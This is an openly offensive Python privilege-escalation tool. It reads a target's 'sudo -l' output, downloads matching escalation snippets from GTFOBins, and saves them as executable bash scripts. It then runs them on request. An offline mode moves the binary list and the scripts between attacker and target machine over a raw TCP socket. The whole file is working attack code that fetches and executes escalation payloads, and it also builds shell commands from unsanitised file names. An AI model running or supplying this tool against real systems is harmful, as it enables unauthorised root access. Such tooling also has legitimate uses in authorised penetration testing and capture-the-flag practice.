# MADE BY Cyberchad @Cyberchad1
#!/usr/bin/env python3
import requests, subprocess, html, sys, getopt, os, http.server, socketserver, re, server, time, socket, re, sys
from threading import Thread
from subprocess import check_output

TCP_PORT = 9001
BUFFER_SIZE = 1024

class ClientThread(Thread):
    def __init__(self,ip,port,sock,files,file):
        Thread.__init__(self)
        self.file = file
        self.files = files
        self.ip = ip
        self.port = port
        self.sock = sock
        print(" New thread started for "+ip+":"+str(port))

    def run(self):
        if self.files[0] != "listfile":
            file = f"exploits/{self.file}"
        else:
            file = self.file
        print(f"Openning {file}")
        f = open(file,'rb')
        while True:
            l = f.read(BUFFER_SIZE)
            while (l):
                self.sock.send(l)
                #print('Sent ',repr(l))
                l = f.read(BUFFER_SIZE)
            if not l:
                f.close()
                self.sock.close()
                break

def startserver(TCP_IP, files):
    tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tcpsock.bind((TCP_IP, TCP_PORT))
    threads = []
    for file in files:
        tcpsock.listen(5)
        print("Waiting for incoming connections...")
        (conn, (ip,port)) = tcpsock.accept()
        print('Got connection from ', (ip,port))
        newthread = ClientThread(ip,port,conn,files,file)
        newthread.start()
        threads.append(newthread)

    for t in threads:
        t.join()

def startclient(TCP_IP,file):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))
    with open(file, 'wb') as f:
        print('file opened')
        while True:
            #print('receiving data...')
            data = s.recv(BUFFER_SIZE)
            print('data =', (data).decode("utf-8").strip())
            if not data:
                f.close()
                print('file close()')
                break
            # write data to a file
            f.write(data)

    print(f'{file} file transfered')
    s.close()
    print('connection closed')


def get_ip():
    valid_ips = 0
    ips = check_output(['hostname', '--all-ip-addresses']).decode("utf-8").split()
    print("Which ip address would you like to use?\n")
    for index, ip in enumerate(ips):
        pattern = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
        test = pattern.match(ip)
        if test:
            print(f"{index} - {ip}\n")
            valid_ips +=1
    # Outputing ip options
    try:
        choice = int(input(">"))
        if choice in range(valid_ips):
                return ips[choice]
        else:
                print("Exiting...")
                sys.exit(2)
    except:
        print("Exiting...")
        sys.exit(2)

def get_shell_code(value, verbose, output):
        os.system("mkdir exploits 2>/dev/null")
        for content in output:
                content = content.strip()
                # Sending GET request to website to pull shell code
                r = requests.get(f'https://gtfobins.github.io/gtfobins/{content}')
                if verbose:
                    print(f"Trying https://gtfobins.github.io/gtfobins/{content}\nStauts code - {r.status_code}")
                if r.status_code == 200:
                        if value == "check":
                            if verbose:
                                print("At least one exploit found")
                            print("True")
                            return 1
                        elif value == "findexploits":
                            # If ClI is "check" then it will return that there is an exploit
                            if verbose:
                                print(f"Appending {content} exploit to bash file")
                            exploits.append(content)
                            text = r.text
                            text = text.split('<h2 id="sudo"')[1]
                            text = text.split('<pre><code>')[1]
                            text = text.split("</code>")[0]
                            exploit_file = open(f"exploits/{content}",'w')
                            exploit_file.write("#!/bin/bash\n")
                            exploit_file.write(html.unescape(text))
                            exploit_file.close()
                            subprocess.run(["chmod", "+x", f"exploits/{content}"])
        if value == "check":
            if verbose:
                print("No exploit found")
            print("False")
            return 0

def sudolist(verbose, offline):
    # Getting contents of sudo -l command to search GTFOBins
    grep = "sudo -l | grep -oE '[^/ ]+$' | tail -n +4"
    if offline:
        os.system(f"{grep} > listfile")
        #fileserver.server(fileserver.get_ip(),"listfile")
    output = subprocess.check_output(grep, shell=True).decode("utf-8").split("\n")
    del output[-1]
    for exploit in output:
        exploits.append(exploit.strip())
    if verbose:
        if offline:
            print("Running sudo -l\nexploits written to listfile")
        else:
            print(f"Running sudo -l\nexploits found = {output}")
    return output

def showexploits():
    print("Which exploit would you like to run?")
    for index, exploit in enumerate(exploits):
            print(f"{index} - {exploit}\n")
    print("Quit - <any other char/int>")
    choice = input(">")
    # Outputing exploit options
    try:
        if int(choice) in range(0,len(exploits)):
                subprocess.run(["chmod", "+x", f"exploits/{exploits[int(choice)]}"])
                subprocess.run(f"./exploits/{exploits[int(choice)]}")

        else:
                print("Exiting...")
                sys.exit(2)
    except:
        print("Exiting...")
        sys.exit(2)


def main(argv):
    verbose = False
    short_options = "ho:v"
    long_options = ["help", "option=", "verbose"]
    help = """\n
--------------------------------------------------
long argument   short argument   value
--------------------------------------------------
--help           -h               n/a
--option         -o               [check|findexploits|offlinetarget|offlinehost|runexploits]
--verbose        -v               n/a
--------------------------------------------------\n"""
    if len(argv) <1:
        print(f"An argument must be set{help}")
    try:
        arguments, values = getopt.getopt(argv, short_options, long_options)
    except getopt.error as error:
        # Output error, and return with an error code
        print(error)
        sys.exit(2)
    # Evaluate given options
    for current_argument, value in arguments:
        if current_argument in ("-h", "--help"):
            print(f"\nDisplaying help:{help}")
        elif current_argument in ("-v","--verbose"):
            verbose = True
        elif current_argument in ("-o", "--option"):
            if value in ["check","findexploits","offlinetarget","offlinehost","runexploits"]:
                print(f"Options mode ({value})")
                global exploits
                exploits = []
                if value == "offlinetarget":
                    sudolist(verbose,True)
                    IP = get_ip()
                    startserver(IP,["listfile"])
                    ip = input("Input hostip (press enter when server is up on target machine)\n>")
                    print(exploits)
                    [startclient(ip,exploit) for exploit in exploits]
                    os.system("mkdir exploits 2>/dev/null")
                    [os.system(f"mv {exploit} exploits/") for exploit in exploits]
                    os.system("rm listfile")
                    showexploits()
                elif value == "offlinehost":
                    # Input validation for listfile to see if it exsists
                    startclient(input("Input target ip\n>"),"listfile")
                    get_shell_code("findexploits",verbose, open("listfile", "r"))
                    IP = get_ip()
                    startserver(IP,exploits)
                    os.system("rm -r exploits")
                    os.system("rm listfile")
                else:
                    get_shell_code(value,verbose, sudolist(verbose,False))
                    if value == "runexploits" and len(exploits)>0:
                        while True:
                            showexploits()
                            getinput = input("Would you like to run another exploit? Y/N \n>")
                            if getinput not in ["y","Y","yes"]:
                                print("Exiting...")
                                sys.exit(2)
            else:
                print(f"\nInvalid Parameters:{help}")

if __name__ == "__main__":
   main(sys.argv[1:])
